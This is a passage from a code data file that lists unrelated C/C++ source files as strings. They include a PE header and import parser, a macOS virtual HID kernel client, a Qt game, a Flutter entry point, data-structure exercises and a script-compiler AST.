result;\n}\n\nuint32_t GlobalDescriptorTable::SegmentDescriptor::Limit() {\n    uint8_t* target = (uint8_t*)this;\n    uint32_t result = target[6] * 0xF;\n    result = (result << 8) + target[1];\n    result = (result << 8) + target[0];\n    \n    if((target[6] & 0xC0) == 0xC0) {\n        result = (result << 12) | 0xFFF;\n    }\n\n    return result;\n}",
    "#include \"portable.hpp\"\r\n\r\nPIMAGE_NT_HEADERS64 portable::GetNtHeaders(void* image_base)\r\n{\r\n\tconst auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);\r\n\r\n\tif (dos_header->e_magic != IMAGE_DOS_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\tconst auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);\r\n\r\n\tif (nt_headers->Signature != IMAGE_NT_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\treturn nt_headers;\r\n}\r\n\r\nportable::vec_relocs portable::GetRelocs(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_relocs relocs;\r\n\tDWORD reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;\r\n\r\n\tif (!reloc_va)\r\n\t\treturn {};\r\n\r\n\tauto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);\r\n\tconst auto reloc_end = reinterpret_cast<uint64_t>(current_base_relocation) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;\r\n\r\n\twhile (current_base_relocation->VirtualAddress && current_base_relocation->VirtualAddress < reloc_end && current_base_relocation->SizeOfBlock)\r\n\t{\r\n\t\tRelocInfo reloc_info;\r\n\r\n\t\treloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;\r\n\t\treloc_info.item = reinterpret_cast<uint16_t*>(reinterpret_cast<uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));\r\n\t\treloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);\r\n\r\n\t\trelocs.push_back(reloc_info);\r\n\r\n\t\tcurrent_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);\r\n\t}\r\n\r\n\treturn relocs;\r\n}\r\n\r\nportable::vec_imports portable::GetImports(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_imports imports;\r\n\r\n\tauto current_import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\r\n\r\n\twhile (current_import_descriptor->FirstThunk)\r\n\t{\r\n\t\tImportInfo import_info;\r\n\r\n\t\timport_info.module_name = std::string(reinterpret_cast<char*>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));\r\n\r\n\t\tauto current_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->FirstThunk);\r\n\t\tauto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);\r\n\r\n\t\twhile (current_originalFirstThunk->u1.Function)\r\n\t\t{\r\n\t\t\tImportFunctionInfo import_function_data;\r\n\r\n\t\t\tauto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base) + current_originalFirstThunk->u1.AddressOfData);\r\n\r\n\t\t\timport_function_data.name = thunk_data->Name;\r\n\t\t\timport_function_data.address = &current_first_thunk->u1.Function;\r\n\r\n\t\t\timport_info.function_datas.push_back(import_function_data);\r\n\r\n\t\t\t++current_originalFirstThunk;\r\n\t\t\t++current_first_thunk;\r\n\t\t}\r\n\r\n\t\timports.push_back(import_info);\r\n\t\t++current_import_descriptor;\r\n\t}\r\n\r\n\treturn imports;\r\n}",
    "/****************************************************************************\n** Resource object code\n**\n** Created by: The Resource Compiler for Qt version 6.7.2\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#ifdef QT_NAMESPACE\n#  define QT_RCC_PREPEND_NAMESPACE(name) ::QT_NAMESPACE::name\n#  define QT_RCC_MANGLE_NAMESPACE0(x) x\n#  define QT_RCC_MANGLE_NAMESPACE1(a, b) a##_##b\n#  define QT_RCC_MANGLE_NAMESPACE2(a, b) QT_RCC_MANGLE_NAMESPACE1(a,b)\n#  define QT_RCC_MANGLE_NAMESPACE(name) QT_RCC_MANGLE_NAMESPACE2( \\\n        QT_RCC_MANGLE_NAMESPACE0(name), QT_RCC_MANGLE_NAMESPACE0(QT_NAMESPACE))\n#else\n#   define QT_RCC_PREPEND_NAMESPACE(name) name\n#   define QT_RCC_MANGLE_NAMESPACE(name) name\n#endif\n\n#ifdef QT_NAMESPACE\nnamespace QT_NAMESPACE {\n#endif\n\n#ifdef QT_NAMESPACE\n}\n#endif\n\nint QT_RCC_MANGLE_NAMESPACE(qInitResources_resources)();\nint QT_RCC_MANGLE_NAMESPACE(qInitResources_resources)()\n{\n    return 1;\n}\n\nint QT_RCC_MANGLE_NAMESPACE(qCleanupResources_resources)();\nint QT_RCC_MANGLE_NAMESPACE(qCleanupResources_resources)()\n{\n    return 1;\n}\n\n#ifdef __clang__\n#   pragma clang diagnostic push\n#   pragma clang diagnostic ignored \"-Wexit-time-destructors\"\n#endif\n\nnamespace {\n   struct initializer {\n       initializer() { QT_RCC_MANGLE_NAMESPACE(qInitResources_resources)(); }\n       ~initializer() { QT_RCC_MANGLE_NAMESPACE(qCleanupResources_resources)(); }\n   } dummy;\n}\n\n#ifdef __clang__\n#   pragma clang diagnostic pop\n#endif\n",
    "\ufeff#include<iostream>\nusing namespace std;\n\nclass Student\n{\n\tchar* name;\n\tint age;\npublic:\n\tStudent();\n\tStudent(const char* n, int a);\n\tStudent(const Student& obj);\n\t~Student();\n\tvoid Print();\n\tvoid Input();\n\tvoid SetName(const char* n);\n\tvoid SetAge(int a);\n\tchar* GetName();\n\tint GetAge();\n\tStudent& operator=(Student& b);\n};\n\nStudent::Student()\n{\n\tname = nullptr;\n\tage = 0;\n}\n\nStudent::Student(const char* n, int a)\n{\n\tname = new char[strlen(n) + 1];\n\tstrcpy_s(name, strlen(n) + 1, n);\n\tage = a;\n}\n\nStudent::Student(const Student& obj)\n{\n\tname = new char[strlen(obj.name) + 1];\n\tstrcpy_s(name, strlen(obj.name) + 1, obj.name);\n\tage = obj.age;\n}\n\nStudent::~Student()\n{\n\tcout << \"Destructor\\n\";\n\tdelete[] name;\n\tage = 0;\n}\n\nvoid Student::Print()\n{\n\tcout << \"Name: \" << name << \" | Age: \" << age << endl;\n}\n\nvoid Student::Input()\n{\n\tchar buff[80];\n\tcout << \"Input student's name\";\n\tcin >> buff;\n\tif (name != nullptr)\n\t{\n\t\tdelete[] name;\n\t}\n\tname = new char[strlen(buff) + 1];\n\tstrcpy_s(name, strlen(buff) + 1, buff);\n\tcout << \"Input student's age\";\n\tcin >> age;\n}\n\nvoid Student::SetName(const char* n)\n{\n\tif (name != nullptr)\n\t{\n\t\tdelete[]name;\n\t}\n\tname = new char[strlen(n) + 1];\n\tstrcpy_s(name, strlen(n) + 1, n);\n}\n\nvoid Student::SetAge(int a)\n{\n\tage = a;\n}\n\nchar* Student::GetName()\n{\n\treturn name;\n}\n\nint Student::GetAge()\n{\n\treturn age;\n}\n\nStudent& Student::operator=(Student& b)\n{\n\tif (this == &b)\n\t{\n\t\treturn *this;\n\t}\n\tif (name != nullptr)\n\t{\n\t\tdelete[] name;\n\t}\n\tname = new char[strlen(b.name) + 1];\n\tstrcpy_s(name, strlen(b.name) + 1, b.name);\n\tage = b.age;\n\treturn *this;\n}\n\nint main()\n{\n\tStudent s1(\"Ivan\", 16);\n\ts1.Print();\n\tStudent s2(\"Sofia\", 21);\n\ts2.Print();\n\ts2 = s1;\n\ts2.Print();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_router_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Span.hpp\"\n\nSpan::Span(unsigned int n) : _n(n){}\nSpan::Span(const Span &ref){*this = ref;}\nSpan& Span::operator=(const Span &ref){\n\tif(this!=&ref){\n\t\tthis->_n=ref._n;\n\t\tthis->_v=ref._v;\n\t}\n\treturn *this;\n}\nSpan::~Span(){}\n\nvoid Span::addNumber(int n){\n\tif (this->_v.size() < this->_n)\n\t\tthis->_v.push_back(n);\n\telse\n\t\tthrow Span::VectorFullException();\n}\n\nvoid Span::addNumber(std::vector<int>::const_iterator first, std::vector<int>::const_iterator last){\n\twhile (first != last){\n\t\tthis->addNumber(*first);\n\t\tfirst++;\n\t}\n}\n\nint Span::longestSpan(){\n\tif (this->_v.size() < 2)\n\t\tthrow Span::TooFewValuesException();\n\tint max = *std::max_element(this->_v.begin(), this->_v.end());\n\tint min = *std::min_element(this->_v.begin(), this->_v.end());\n\treturn (max - min);\n}\n\nint Span::shortestSpan(){\n\tint span = this->longestSpan();\n\tfor (std::vector<int>::const_iterator it = this->_v.begin(); it != this->_v.end(); it++){\n\t\tfor (std::vector<int>::const_iterator it2 = this->_v.begin(); it2 != this->_v.end(); it2++){\n\t\t\tif (it != it2 && std::abs(*it - *it2) < span)\n\t\t\t\tspan = std::abs(*it - *it2);\n\t\t}\n\t}\n\treturn span;\n}\n\nstd::vector<int> Span::getVector(){\n\treturn this->_v;\n}\n\nvoid Span::print(){\n\tint i = 0;\n\tfor (std::vector<int>::const_iterator it = this->_v.begin(); it != this->_v.end(); it++){\n\t\tstd::cout << *it << \" | \";\n\t\ti++;\n\t\tif (i > 30){\n\t\t\tstd::cout << std::endl;\n\t\t\ti = 0;\n\t\t}\n\t}\n\tstd::cout << std::endl;\n}\n\n",
    "//\n//  VirtHID_UserClient.cpp\n//  VirtHID\n//\n//  Created by Viktor Varenik on 17.10.2024.\n//\n\n#include <IOKit/IOLib.h>\n#include <IOKit/IOKitKeys.h>\n\n#include \"VirtHID_UserClient.hpp\"\n#include \"VirtHID_Types.hpp\"\n#include \"debug.h\"\n#include <string.h>\n\n#define super IOUserClient\nOSDefineMetaClassAndStructors(it_kotleni_virthid_userclient, IOUserClient)\n\nbool it_kotleni_virthid_userclient::initWithTask(task_t owningTask, void *securityToken,\n                                              UInt32 type, OSDictionary *properties) {\n    LogD(\"Executing 'it_kotleni_virthid_userclient::initWithTask()'.\");\n    \n    if (!owningTask) {\n        return false;\n    }\n    \n    if (!super::initWithTask(owningTask, securityToken, type, properties)) {\n        return false;\n    }\n    \n    m_owner = owningTask;\n    \n    return true;\n}\n\nbool it_kotleni_virthid_userclient::start(IOService *provider) {\n    LogD(\"Executing 'it_kotleni_virthid_userclient::start()'.\");\n    \n    if (!super::start(provider)) {\n        return false;\n    }\n    \n    m_hid_provider = OSDynamicCast(it_kotleni_virthid, provider);\n    if (!m_hid_provider) {\n        return false;\n    }\n    \n    return true;\n}\n\nvoid it_kotleni_virthid_userclient::stop(IOService *provider) {\n    LogD(\"Executing 'it_kotleni_virthid_userclient::stop()'.\");\n    super::stop(provider);\n}\n\n/**\n * A dispatch table for this User Client interface, used by 'it_kotleni_virthid_userclient::externalMethod()'.\n * The fields of the IOExternalMethodDispatch type follows:\n *\n *  struct IOExternalMethodDispatch\n *  {\n *      IOExternalMethodAction function;\n *      uint32_t           checkScalarInputCount;\n *      uint32_t           checkStructureInputSize;\n *      uint32_t           checkScalarOutputCount;\n *      uint32_t           checkStructureOutputSize;\n *  };\n */\nconst IOExternalMethodDispatch it_kotleni_virthid_userclient::s_methods[it_kotleni_virthid_method_count] = {\n    {(IOExternalMethodAction)&it_kotleni_virthid_userclient::sMethodCreate, 8, 0, 0, 0},\n    {(IOExternalMethodAction)&it_kotleni_virthid_userclient::sMethodDestroy, 2, 0, 0, 0},\n    {(IOExternalMethodAction)&it_kotleni_virthid_userclient::sMethodSend, 4, 0, 0, 0},\n    {(IOExternalMethodAction)&it_kotleni_virthid_userclient::sMethodList, 2, 0, 2, 0},\n    {(IOExternalMethodAction)&it_kotleni_virthid_userclient::sMethodSubscribe, 2, 0, 0, 0},\n};\n\nIOReturn it_kotleni_virthid_userclient::externalMethod(uint32_t selector, IOExternalMethodArguments *arguments,\n                                                    IOExternalMethodDispatch *dispatch, OSObject *target, void *reference) {\n    LogD(\"Executing 'it_kotleni_virthid_userclient::externalMethod()' with selector #%d.\", selector);\n    \n    if (selector >= it_kotleni_virthid_method_count) {\n        return kIOReturnUnsupported;\n    }\n    \n    dispatch = (IOExternalMethodDispatch *)&s_methods[selector];\n    target = this;\n    reference = nullptr;\n    \n    return super::externalMethod(selector, arguments, dispatch, target, reference);\n}\n\nIOReturn it_kotleni_virthid_userclient::sMethodCreate(it_kotleni_virthid_userclient *target, void *reference,\n                                                  IOExternalMethodArguments *arguments) {\n    return target->methodCreate(arguments);\n}\n\nIOReturn it_kotleni_virthid_userclient::sMethodDestroy(it_kotleni_virthid_userclient *target, void *reference,\n                                                   IOExternalMethodArguments *arguments) {\n    return target->methodDestroy(arguments);\n}\n\nIOReturn it_kotleni_virthid_userclient::sMethodSend(it_kotleni_virthid_userclient *target, void *reference,\n                                                IOExternalMethodArguments *arguments) {\n    return target->methodSend(arguments);\n}\n\nIOReturn it_kotleni_virthid_userclient::sMethodList(it_kotleni_virthid_userclient *target, void *reference,\n                                                IOExternalMethodArguments *arguments) {\n    return target->methodList(arguments);\n}\n\nIOReturn it_kotleni_virthid_userclient::sMethodSubscribe(it_kotleni_virthid_userclient *target, void *reference,\n                                                 IOExternalMethodArguments *arguments) {\n    return target->methodSubscribe(arguments);\n}\n\nIOReturn it_kotleni_virthid_userclient::methodCreate(IOExternalMethodArguments *arguments) {\n    IOMemoryDescriptor *user_buf = nullptr;\n    IOMemoryDescriptor *descriptor_buf = nullptr;\n    IOMemoryDescriptor *serial_number_buf = nullptr;\n    \n    bool user_buf_complete = false;\n    bool descriptor_buf_complete = false;\n    bool serial_number_buf_complete = false;\n    \n    IOMemoryMap *map = nullptr;\n    IOMemoryMap *map2 = nullptr;\n    IOMemoryMap *map3 = nullptr;\n    \n    char *ptr = nullptr;\n    unsigned char *ptr2 = nullptr;\n    char *ptr3 = nullptr;\n    \n    bool ret = false;\n    \n    UInt8 *name_ptr = (UInt8 *)arguments->scalarInput[0];\n    UInt8 name_len = (UInt8)arguments->scalarInput[1];\n    UInt8 *descriptor_ptr = (UInt8 *)arguments",
    "#include <Game.h>\r\n#include <QTimer>\r\n#include <QGraphicsTextItem>\r\n#include <QFont>\r\n#include <Enemy.h>\r\n#include <Wall.h>\r\n#include <QMediaPlayer>\r\n#include <QImage>\r\n\r\n\r\nGame::Game(QWidget *parent)\r\n{\r\n    enemy_count = 8;\r\n    QGraphicsScene *scene = new QGraphicsScene();\r\n    QGraphicsView *view = new QGraphicsView(scene);\r\n    scene->setBackgroundBrush(QBrush(Qt::black));\r\n    view->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\r\n    view->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\r\n    view->setFixedSize(800, 600);\r\n    scene->setSceneRect(0, 0, 800, 600);\r\n    view->show();\r\n    Player *player = new Player();\r\n    scene->addItem(player);\r\n    player->setFlag(QGraphicsItem::ItemIsFocusable);\r\n    player->setFocus();\r\n    player->setPos(view->width()/2, view->height()-80);\r\n    Enemy *enemy1 = new Enemy();\r\n    scene->addItem(enemy1);\r\n    Enemy *enemy2 = new Enemy();\r\n    scene->addItem(enemy2);\r\n    Enemy *enemy3 = new Enemy();\r\n    scene->addItem(enemy3);\r\n    Enemy *enemy4 = new Enemy(3000, 1);\r\n    scene->addItem(enemy4);\r\n    Enemy *enemy5 = new Enemy(4000, 1);\r\n    scene->addItem(enemy5);\r\n    Enemy *enemy6 = new Enemy(2000, 1);\r\n    scene->addItem(enemy6);\r\n    Enemy *enemy7 = new Enemy(0, 3);\r\n    scene->addItem(enemy7);\r\n    Enemy *enemy8 = new Enemy(0, 3);\r\n    scene->addItem(enemy8);\r\n    for(int x=10, i=0 ; i<4 ; i++){\r\n        Wall *wall1 = new Wall(x+35, 400);\r\n        scene->addItem(wall1);\r\n        Wall *wall2 = new Wall(x+50, 400);\r\n        scene->addItem(wall2);\r\n        Wall *wall3 = new Wall(x+65, 400);\r\n        scene->addItem(wall3);\r\n        Wall *wall4 = new Wall(x+80, 400);\r\n        scene->addItem(wall4);\r\n        Wall *wall5 = new Wall(x+95, 400);\r\n        scene->addItem(wall5);\r\n        Wall *wall6 = new Wall(x+110, 400);\r\n        scene->addItem(wall6);\r\n        Wall *wall7 = new Wall(x+125, 400);\r\n        scene->addItem(wall7);\r\n        Wall *wall8 = new Wall(x+140, 400);\r\n        scene->addItem(wall8);\r\n        Wall *wall9 = new Wall(x+35, 385);\r\n        scene->addItem(wall9);\r\n        Wall *wall10 = new Wall(x+50, 385);\r\n        scene->addItem(wall10);\r\n        Wall *wall11 = new Wall(x+65, 385);\r\n        scene->addItem(wall11);\r\n        Wall *wall12 = new Wall(x+80, 385);\r\n        scene->addItem(wall12);\r\n        Wall *wall13 = new Wall(x+95, 385);\r\n        scene->addItem(wall13);\r\n        Wall *wall14 = new Wall(x+110, 385);\r\n        scene->addItem(wall14);\r\n        Wall *wall15 = new Wall(x+125, 385);\r\n        scene->addItem(wall15);\r\n        Wall *wall16 = new Wall(x+140, 385);\r\n        scene->addItem(wall16);\r\n        Wall *wall17 = new Wall(x+35, 370);\r\n        scene->addItem(wall17);\r\n        Wall *wall18 = new Wall(x+65, 370);\r\n        scene->addItem(wall18);\r\n        Wall *wall19 = new Wall(x+110, 370);\r\n        scene->addItem(wall19);\r\n        Wall *wall20 = new Wall(x+140, 370);\r\n        scene->addItem(wall20);\r\n        x += 200;\r\n    }\r\n    score = new Score();\r\n    health = new Health();\r\n    health->setPos(health->x(), health->y()+40);\r\n    scene->addItem(score);\r\n    scene->addItem(health);\r\n    QMediaPlayer *music = new QMediaPlayer();\r\n    music->setMedia(QUrl(\"qrc:/sounds/bgsound.mp3\"));\r\n    music->play();\r\n}\r\n",
    "#include \"../includes/DoublyLinkedList.hpp\"\n#include <iostream>\n\n\nDoublyLinkedList::DoublyLinkedList(){\n    head = nullptr;\n    tail = nullptr;\n\n}\n\nDoublyLinkedList::~DoublyLinkedList(){\n    DoubleNode* tmp = head;\n    while (tmp != nullptr){\n        DoubleNode* next = tmp->next;\n        delete tmp;\n        tmp = next;\n    }\n}\n\nvoid DoublyLinkedList::printList() {\n    DoubleNode* current = head;\n    while (current != nullptr) {\n        std::cout << current->data << \" \";\n        current = current->next;\n    }\n    std::cout << std::endl;\n}\n\n// Insertion\nvoid DoublyLinkedList::insertFirst(DoubleNode *newNode){\n    if(tail == nullptr){\n        tail = newNode;\n    }\n    else{\n        head->previous = newNode;\n    }\n    newNode->next = head;\n    head = newNode;\n}\n\nvoid DoublyLinkedList::insertLast(DoubleNode *newNode){\n    if(head == nullptr){\n        head = newNode;\n    }\n    else{\n        tail->next = newNode;\n    }\n    newNode->previous = tail;\n    tail = newNode;\n}\n\nvoid DoublyLinkedList::insertMiddle(DoubleNode * newNode, DoubleNode * previous){\n    newNode->next = previous->next; \n    newNode->previous = previous;\n    previous->next->previous = newNode;\n    previous->next = newNode;\n}\n\n// Deletion\nvoid DoublyLinkedList::deleteFirst(){\n    DoubleNode * tmp = head;\n    head = head->next;\n    if(head == nullptr){\n        tail = nullptr;\n    }\n    else{\n        head->previous = nullptr;\n    }\n    delete tmp;\n}\n\nvoid DoublyLinkedList::deleteLast(){\n    DoubleNode * tmp = tail;\n    tail = tail->previous;\n    if(tail == nullptr){\n        head = nullptr;\n    }\n    else{\n        tail->next = nullptr;\n    }\n    delete tmp;\n}\n\nvoid DoublyLinkedList::deleteMiddle(DoubleNode * s){\n    s->next->previous = s->previous;\n    s->previous->next = s->next;\n    delete s;\n}",
    "#include \"seller.h\"\n#include <algorithm>\n#include <random>\n#include <cassert>\n\nSeller *Seller::chooseRandomSeller(std::vector<Seller *> &sellers) {\n    assert(sellers.size());\n    std::vector<Seller*> out;\n    std::sample(sellers.begin(), sellers.end(), std::back_inserter(out),\n            1, std::mt19937{std::random_device{}()});\n    return out.front();\n}\n\nItemType Seller::chooseRandomItem(std::map<ItemType, int> &itemsForSale) {\n    if (!itemsForSale.size()) {\n        return ItemType::Nothing;\n    }\n    std::vector<std::pair<ItemType, int> > out;\n    std::sample(itemsForSale.begin(), itemsForSale.end(), std::back_inserter(out),\n            1, std::mt19937{std::random_device{}()});\n    return out.front().first;\n}\n\nint getCostPerUnit(ItemType item) {\n    switch (item) {\n        case ItemType::Syringe : return SYRINGUE_COST;\n        case ItemType::Pill : return PILL_COST;\n        case ItemType::Scalpel : return SCALPEL_COST;\n        case ItemType::Thermometer : return THERMOMETER_COST;\n        case ItemType::Stethoscope : return STETHOSCOPE_COST;\n        case ItemType::PatientHealed : return HEALING_COST;\n        case ItemType::PatientSick : return TRANSFER_COST;\n        default : return 0;\n    }\n}\n\nQString getItemName(ItemType item) {\n    switch (item) {\n        case ItemType::Syringe : return \"Syringe\";\n        case ItemType::Pill : return \"Pill\";\n        case ItemType::Scalpel : return \"Scalpel\";\n        case ItemType::Thermometer : return \"Thermometer\";\n        case ItemType::Stethoscope : return \"Stethoscope\";\n        case ItemType::PatientHealed : return \"Patient Healed\";\n        case ItemType::PatientSick : return \"Patient Sick\";\n        case ItemType::Nothing : return \"Nothing\";\n        default : return \"???\";\n    }\n}\n\nEmployeeType getEmployeeThatProduces(ItemType item) {\n    switch (item) {\n        case ItemType::Syringe : /* fallthrough */\n        case ItemType::Pill : /* fallthrough */\n        case ItemType::Scalpel : /* fallthrough */\n        case ItemType::Thermometer : /* fallthrough */\n        case ItemType::PatientSick : /* fallthrough */\n        case ItemType::Stethoscope : return EmployeeType::Supplier;\n        case ItemType::PatientHealed : return EmployeeType::Doctor;\n        default : return EmployeeType::Nurse;\n    }\n}\n\nint getEmployeeSalary(EmployeeType employee) {\n    switch (employee) {\n        case EmployeeType::Nurse : return NURSE_COST;\n        case EmployeeType::Supplier : return SUPPLIER_COST;\n        case EmployeeType::Doctor : return DOCTOR_COST;\n        default : return 0;\n    }\n}\n",
    "#include <iostream>\r\n#include \"t1.cpp\"\r\nusing namespace std;\r\n\r\nint main() {\r\n    const int Max = 10;\r\n    Mahasiswa mhs[Max];\r\n    \r\n    cout << \"Masukkan jumlah mahasiswa: \";\r\n    int n;\r\n    cin >> n;\r\n    cin.ignore();\r\n\r\n    if (n > Max) {\r\n        cout << \"Jumlah mahasiswa melebihi batas\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    for (int i = 0; i < n; i++) {\r\n        cout << endl;\r\n        cout << \"Mahasiswa ke-\" << i + 1 << endl;\r\n        inputMahasiswa(mhs[i]);\r\n    }\r\n\r\n    cout << endl;\r\n    cout << \"Daftar Mahasiswa\" << endl;\r\n\r\n    for (int i = 0; i < n; i++) {\r\n        cout << \"Mahasiswa ke-\" << i + 1 << endl;\r\n        cout << \"Nama        : \" << mhs[i].nama << endl;\r\n        cout << \"NIM         : \" << mhs[i].nim << endl;\r\n        cout << \"Nilai UTS   : \" << mhs[i].uts << endl;\r\n        cout << \"Nilai UAS   : \" << mhs[i].uas << endl;\r\n        cout << \"Nilai Tugas : \" << mhs[i].tugas << endl;\r\n        cout << \"Nilai Akhir : \" << mhs[i].nilaiAkhir << endl;\r\n        cout << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"Stack.h\"\n\ntemplate <typename T> Stack<T>::Stack(T data) : len{1} {\n  buffer = new T[len];\n  buffer[0] = data;\n}\n\ntemplate <typename T>\nStack<T>::Stack(std::initializer_list<T> data) : len{(int)data.size()} {\n  buffer = new T[data.size()];\n\n  for (int i{}; i < len; ++i) {\n    buffer[i] = *(data.begin() + i);\n  }\n}\n\ntemplate <typename T> int Stack<T>::length() { return len; }\n\ntemplate <typename T> void Stack<T>::push(T data) {\n  if (buffer == nullptr) {\n    buffer = new T{data};\n    len++;\n    return;\n  }\n\n  T *temp{buffer};\n  buffer = new T[len + 1];\n\n  for (int i{}; i < len; ++i) {\n    buffer[i] = temp[i];\n  }\n\n  buffer[len] = data;\n\n  len++;\n}\n\ntemplate <typename T> T Stack<T>::pop() {\n  try {\n    if (buffer == nullptr) {\n      throw \"ERROR: cannot pop from empty stack\\n\";\n    }\n  } catch (std::string msg) {\n    std::cout << msg;\n  }\n\n  if (len == 1) {\n    T val = *buffer;\n    delete buffer;\n    buffer = nullptr;\n    len = 0;\n    return val;\n  }\n\n  T *temp{buffer};\n  buffer = new T[len - 1];\n\n  for (int i{}; i < len - 1; ++i) {\n    buffer[i] = temp[i];\n  }\n\n  T val{temp[len - 1]};\n\n  delete temp;\n\n  len--;\n\n  return val;\n}\n",
    "//==============================================================================\r\n//\r\n//  xsc_ast\r\n//\r\n//==============================================================================\r\n\r\n#include \"xsc_ast.hpp\"\r\n#include \"xsc_tokenizer.hpp\"\r\n#include \"xsc_errors.hpp\"\r\n#include \"xsc_symbol_table.hpp\"\r\n#include \"xsc_compiler.hpp\"\r\n\r\n//==============================================================================\r\n//  Defines\r\n//==============================================================================\r\n\r\n#define NODES_PER_POOL  1024\r\n\r\n//==============================================================================\r\n//  xsc_ast\r\n//==============================================================================\r\n\r\nxsc_ast::xsc_ast( const xwstring&         Source,\r\n                  const xsc_tokenizer&    Tokenizer,\r\n                  xsc_errors&             Errors,\r\n                  xsc_symbol_table&       SymbolTable) : m_Source     ( Source ),\r\n                                                         m_Tokenizer  ( Tokenizer ),\r\n                                                         m_Errors     ( Errors ),\r\n                                                         m_SymbolTable( SymbolTable )\r\n{\r\n}\r\n\r\n//==============================================================================\r\n//  ~xsc_ast\r\n//==============================================================================\r\n\r\nxsc_ast::~xsc_ast( void )\r\n{\r\n}\r\n\r\n//==============================================================================\r\n//  NewNode\r\n//==============================================================================\r\n\r\nxsc_ast_node* xsc_ast::NewNode( ast_node_type NodeType )\r\n{\r\n    s32 iPool = m_Pools.GetCount()-1;\r\n\r\n    // Create a new pool if necessary\r\n    if( (iPool < 0) || (m_Pools[iPool].iNode == m_Pools[iPool].nNodes) )\r\n    {\r\n        pool& Pool = m_Pools.Append();\r\n        Pool.nNodes = NODES_PER_POOL;\r\n        Pool.iNode  = 0;\r\n        Pool.pNodes = new xsc_ast_node[Pool.nNodes];\r\n        iPool = m_Pools.GetCount()-1;\r\n    }\r\n\r\n    // Create new node, TODO: Add a pool system for node allocation\r\n    xsc_ast_node* pASTnode = &m_Pools[iPool].pNodes[m_Pools[iPool].iNode++];\r\n    ASSERT( pASTnode );\r\n\r\n    // Initialize the node\r\n    pASTnode->NodeType  = NodeType;\r\n    pASTnode->pToken    = NULL;\r\n    pASTnode->pSymbol   = NULL;\r\n    pASTnode->Type      = typeref(g_pTvoid);\r\n    pASTnode->pScope    = NULL;\r\n\r\n    // Return the new node\r\n    return pASTnode;\r\n}\r\n\r\n//==============================================================================\r\n//  DeleteNode\r\n//==============================================================================\r\n\r\nvoid xsc_ast::DeleteNode( xsc_ast_node* pNode )\r\n{\r\n    // TODO: Implement\r\n    ASSERT( 0 );\r\n}\r\n\r\n//==============================================================================\r\n//  Dump\r\n//==============================================================================\r\n\r\nstatic xstring GetSymbolName( const xsc_symbol* pSymbol )\r\n{\r\n    xstring String = \"<null>\";\r\n\r\n    if( pSymbol )\r\n        String = xstring(pSymbol->Name);\r\n    return String;\r\n}\r\n\r\nxstring xsc_ast::Dump( xsc_ast_node* pNode ) const\r\n{\r\n    static s32  Indent = 0;\r\n    xstring     Output;\r\n    s32         i;\r\n\r\n    if( pNode )\r\n    {\r\n        // Display this node\r\n        { for( i=0 ; i<Indent ; i++ ) Output.AddFormat( \" \" ); }\r\n\r\n        switch( pNode->NodeType )\r\n        {\r\n        case ast_module:\r\n            Output.AddFormat( \"<module>\\n\" ); break;\r\n        case ast_class:\r\n            